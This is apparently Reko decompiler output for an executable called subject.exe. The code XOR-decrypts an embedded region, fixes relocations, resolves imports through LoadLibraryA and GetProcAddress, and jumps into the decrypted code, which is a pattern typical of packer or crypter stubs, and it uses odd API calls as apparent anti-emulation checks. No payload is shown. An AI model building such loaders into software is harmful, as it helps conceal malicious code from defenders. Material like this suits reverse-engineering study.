// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 eax_28 = AddAce(null, 0x00, 0x00, null, 0x00);
	Eq_17 esi_15 = 0x00;
	word32 ebx_282 = eax_28 + 22;
	if (AreAnyAccessesGranted(~0x00, ~0x00) == 0x00)
		ebx_282 = eax_28 - 0x0C;
	struct Eq_31 * eax_48 = null;
	do
	{
		if (esi_15 == ebx_282)
			esi_15.u0 = 0x00;
		eax_48[0x00401190] = (struct Eq_31) (eax_48[0x00401190] ^ *((word32) esi_15 + 0x00404000));
		eax_48 = eax_48 + 0x01;
		esi_15 = (word32) esi_15 + 0x01;
	} while (eax_48 < (struct Eq_31 *) 0x1440);
	struct Eq_53 * ecx_115 = &globals->t402490;
	uint32 dwLoc08_119 = 0x00;
	do
	{
		Eq_57 eax_93 = ecx_115->t0004;
		word16 * edx_100 = (char *) &ecx_115->t0004 + 0x04;
		if (eax_93 - 0x08 >> 0x01 > 0x00)
		{
			uint32 esi_259 = eax_93 - 0x08 >> 0x01;
			do
			{
				ui32 eax_262 = (word32) *edx_100;
				if ((eax_262 & 0xF000) == 0x3000)
				{
					struct Eq_89 * eax_274 = (eax_262 & 0x0FFF) + ecx_115->dw0000;
					eax_274->dw400F10 = eax_274->dw400F10 + 4030730000;
				}
				edx_100 = edx_100 + 0x01;
				esi_259 = esi_259 - 0x01;
			} while (esi_259 != 0x00);
		}
		Eq_57 eax_105 = ecx_115->t0004;
		uint32 edx_107 = (word32) eax_105.u0 + dwLoc08_119;
		word32 ecx_108 = ecx_115 + eax_105;
		int32 eax_112 = ecx_108->dw0004;
		uint32 edx_114 = edx_107 + eax_112;
		ecx_115 = (struct Eq_53 *) (ecx_108 + eax_112 / 0x08);
		dwLoc08_119 = edx_114;
	} while (edx_114 < 228);
	struct Eq_117 * esi_125 = &globals->t401C84;
	struct Eq_117 * dwLoc08_126 = &globals->t401C84;
	esi_160 = esi_125;
	if (globals->dw401C94 != 0x00)
	{
		do
		{
			struct Eq_117 * esi_160;
			Eq_164 eax_178 = LoadLibraryA(esi_160->dw000C + 0x00400F10);
			if (eax_178 != null)
			{
				word32 ebx_208 = esi_160->dw0000;
				if (ebx_208 == 0x00)
					ebx_208 = esi_160->dw0010;
				word32 * ebx_214 = ebx_208 + 0x00400F10;
				word32 * edi_215 = esi_160->dw0010 + 0x00400F10;
				if (*ebx_214 != 0x00)
				{
					do
					{
						Eq_158 dwLoc1C_235;
						int32 eax_230 = *ebx_214;
						word16 ax_231 = (word16) eax_230;
						if (eax_230 < 0x00)
							dwLoc1C_235 = (word32) ax_231;
						else
							dwLoc1C_235 = eax_230 + 0x00400F12;
						*edi_215 = (word32) GetProcAddress(eax_178, dwLoc1C_235);
						ebx_214 = ebx_214 + 0x01;
						edi_215 = edi_215 + 0x01;
					} while (*ebx_214 != 0x00);
					esi_160 = dwLoc08_126;
				}
			}
			esi_160 = esi_160 + 0x01;
			dwLoc08_126 = esi_160;
		} while (esi_160->dw0010 != 0x00);
	}
	ptr32 esp_137;
	byte SCZO_138;
	word32 ebx_139;
	word32 ebp_140;
	word32 esi_141;
	word32 edi_142;
	byte SZO_143;
	byte C_144;
	word32 edx_145;
	word32 eax_146;
	word32 ecx_147;
	byte Z_148;
	byte cl_149;
	byte S_150;
	word16 ax_151;
	globals->t401960();
	*(esp_137 - 0x04) = 0x00;
	ExitProcess(*(esp_137 - 0x04));
}

